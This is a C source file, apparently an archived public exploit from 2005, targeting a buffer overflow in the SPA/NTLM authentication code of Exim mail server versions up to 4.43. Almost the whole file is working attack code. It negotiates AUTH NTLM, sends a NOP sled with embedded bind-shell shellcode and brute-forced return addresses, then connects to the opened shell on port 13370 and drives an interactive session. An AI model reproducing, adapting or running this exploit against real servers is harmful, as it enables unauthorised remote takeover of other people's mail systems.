/* ecl-eximspa.c
 * Yuri Gushin <yuri@eclipse.org.il>
 *
 * Howdy :)
 * This is pretty straightforward, an exploit for the recently
 * discovered vulnerability in Exim's (all versions prior to and
 * including 4.43) SPA authentication code - spa_base64_to_bits()
 * will overflow a fixed-size buffer since there's no decent
 * boundary checks before it in auth_spa_server()
 *
 * Greets fly out to the ECL crew, Alex Behar, Valentin Slavov
 * blexim, manevski, elius, shrink, and everyone else who got left
 * out :D
 *
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>

#define SC_PORT 13370
#define NOP 0xfd

struct {
  char *name;
  int retaddr;
} targets[] = {
  { "Bruteforce", 0xbfffffff },
  { "Debian Sarge exim4-daemon-heavy_4.34-9", 0xbfffed00 },
};

char sc[] = // thank you metasploit, skape, vlad902
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
"\x43\x52\x66\x68\x34\x3a\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\x89\xe1\xcd\x80";

struct {
  struct sockaddr_in host;
  int target;
  int offset;
  u_short wait;
} options;

static int brutemode;

int connect_port(u_short port);
void init_SPA(int sock);
void exploit(int sock, int address);
void shell(int sock);
void spa_bits_to_base64 (unsigned char *out, const unsigned char *in, int inlen);
void parse_options(int argc, char **argv);
void usage(char *cmd);
void banner(void);

int main(int argc, char **argv)
{
  int address, sock_smtp, sock_shell;

  banner();
  parse_options(argc, argv);
  address = targets[options.target].retaddr - options.offset;
  brutemode = 0;

 bruteforce:

  if (!brutemode)
    {
      printf("[*] Connecting to %s:%d... ",
	     inet_ntoa(options.host.sin_addr), ntohs(options.host.sin_port));
      fflush(stdout);
    }

  sock_smtp = connect_port(ntohs(options.host.sin_port));

  if (!brutemode)
    {
      if (!sock_smtp) 
	{
	  printf("failed.\n\n");
	  exit(-1);
	}
      printf("success.\n");
    }

  init_SPA(sock_smtp);
  exploit(sock_smtp, address);
  close(sock_smtp);

  printf("[*] Target: %s - 0x%.8x\n", targets[options.target].name, address);
  printf("[*] Exploit sent, spawning a shell... ");
  fflush(stdout);

  sleep(1); // patience grasshopper
  sock_shell = connect_port(SC_PORT);

  if (!sock_shell && options.target)
    {
      printf("failed.\n\n");
      exit(-1);
    }
  if (!sock_shell)
    {
      printf("failed.\n\n");
      address -= 1000 - strlen(sc);
      brutemode = 1;
      if (options.wait) sleep(options.wait);
      goto bruteforce;
    }
  printf("success!\n\nEnjoy your shell :)\n\n");
  shell(sock_shell);

  return 0;
}

int connect_port(u_short port)
{
  int sock;
  struct sockaddr_in host;

  memcpy(&host, &options.host, sizeof(options.host));
  host.sin_port = ntohs(port);

  if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
      return 0;
  if(connect(sock, (struct sockaddr *)&host, sizeof(host)) < 0)
    {
      close(sock);
      return 0;
    }

  return sock;
}

void init_SPA(int sock)
{
  char buffer[1024];

  memset(buffer, 0, sizeof(buffer));
  if (!read(sock, buffer, sizeof(buffer)))
    err(-1, "read");
  buffer[255] = '\0';

  if (!brutemode)
    printf("[*] Server banner: %s", buffer);

  write(sock, "EHLO ECL.PWNZ.J00\n", 18);
  memset(buffer, 0, sizeof(buffer));
  if (!read(sock, buffer, sizeof(buffer)))
    err(-1, "read");
  else
    if (!brutemode && (!strstr(buffer, "NTLM")))
      printf("[?] Server doesn't seem to support SPA, trying anyway\n");
  write(sock, "AUTH NTLM\n", 10);
  memset(buffer, 0, sizeof(buffer));
  if (!read(sock, buffer, sizeof(buffer)))
    err(-1, "read");
  else
    if (!brutemode && (!strstr(buffer, "334")))
      {
        printf("[!] SPA unsupported! Server responds: %s\n\n", buffer);
        exit(1);
      }
  if (!brutemode) printf("[*] SPA (NTLM) supported\n");
}

void exploit(int sock, int address)
{
  char exp[2000], exp_base64[2668];
  int *address_p;
  int i;

  memset(exp, NOP, 1000);
  memcpy(&exp[1000]-strlen(sc), sc, strlen(sc));
  address_p = (int *)&exp[1000];
  for (i=0; i<1000; i+=4)
    *(address_p++) = address;
  spa_bits_to_base64(exp_base64, exp, sizeof(exp));

  write(sock, exp_base64, sizeof(exp_base64));
  write(sock, "\n", 1);
}

void shell(int sock)
{
  int n;
  fd_set fd;
  char buff[1024];

  write(sock,"uname -a;id\n",12);

  while(1)
    {
     
      FD_SET(sock, &fd);
      FD_SET(0, &fd);

      select(sock+1, &fd, NULL, NULL, NULL);

      if( FD_ISSET(sock, &fd) )
        {
          n = read(sock, buff, sizeof(buff));
          if (n < 0) err(1, "remote read");
          write(1, buff, n);
        }

      if ( FD_ISSET(0, &fd) )
        {
          n = read(0, buff, sizeof(buff));
          if (n < 0) err(1, "local read");
          write(sock, buff, n);
        }
    }    
}

char base64digits[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
void spa_bits_to_base64 (unsigned char *out, const unsigned char *in, int inlen)
{
  for (; inlen >= 3; inlen -= 3)
    {
      *out++ = base64digits[in[0] >> 2];
      *out++ = base64digits[((in[0] << 4) & 0x30) | (in[1] >> 4)];
      *out++ = base64digits[((in[1] << 2) & 0x3c) | (in[2] >> 6)];
      *out++ = base64digits[in[2] & 0x3f];
      in += 3;
    }
  if (inlen > 0)
    {
      unsigned char fragment;

      *out++ = base64digits[in[0] >> 2];
      fragment = (in[0] << 4) & 0x30;
      if (inlen > 1)
        fragment |= in[1] >> 4;
      *out++ = base64digits[fragment];
      *out++ = (inlen < 2) ? '=' : base64digits[(in[1] << 2) & 0x3c];
      *out++ = '=';
    }
  *out = '\0';
}

void parse_options(int argc, char **argv)
{
  int ch;
  struct hostent *hn;

  memset(&options, 0, sizeof(options));

  options.host.sin_family = AF_INET;
  options.host.sin_port = htons(25);
  options.target = -1;
  options.wait = 1;

  while (( ch = getopt(argc, argv, "h:p:t:o:w:")) != -1)
    switch(ch)
      {
      case 'h':
        if ( (hn = gethostbyname(optarg)) == NULL)
          errx(-1, "Unresolvable address\n");
        memcpy(&options.host.sin_addr, hn->h_addr, hn->h_length);
        break;
      case 'p':
        options.host.sin_port = htons((u_short)atoi(optarg));
        break;
      case 't':
        if ((atoi(optarg) > (sizeof(targets)/8-1) || (atoi(optarg) < 0)))
          errx(-1, "Bad target\n");
        options.target = atoi(optarg);
        break;
      case 'o':
        options.offset = atoi(optarg);
        break;
      case 'w':
        options.wait = (u_short)atoi(optarg);
        break;
      case '?':
	exit(1);
      default:
        usage(argv[0]);
      }

  if (!options.host.sin_addr.s_addr || (options.target == -1) )
    usage(argv[0]);
}

void usage(char *cmd)
{
  int i;

  printf("Usage: %s [ -h host ] [ -p port ] [ -t target ] [ -o offset ] [ -w wait ]\n\n"
	 "\t-h: remote host\n"
	 "\t-p: remote port\n"
	 "\t-t: target return address (see below)\n"
	 "\t-o: return address offset\n"
	 "\t-w: seconds to wait before bruteforce reconnecting\n\n",
	 cmd);
  printf("Targets:\n");
  for (i=0; i<(sizeof(targets)/8); i++)
    printf("%d - %s (0x%.8x)\n", i, targets[i].name, targets[i].retaddr);
  printf("\n");
  exit(1);
}

void banner(void)
{
  printf("\t\tExim <= 4.43 SPA authentication exploit\n"
         "\t\t   Yuri Gushin <yuri@eclipse.org.il>\n"
         "\t\t\t       ECL Team\n\n\n");
}

// milw0rm.com [2005-02-12]
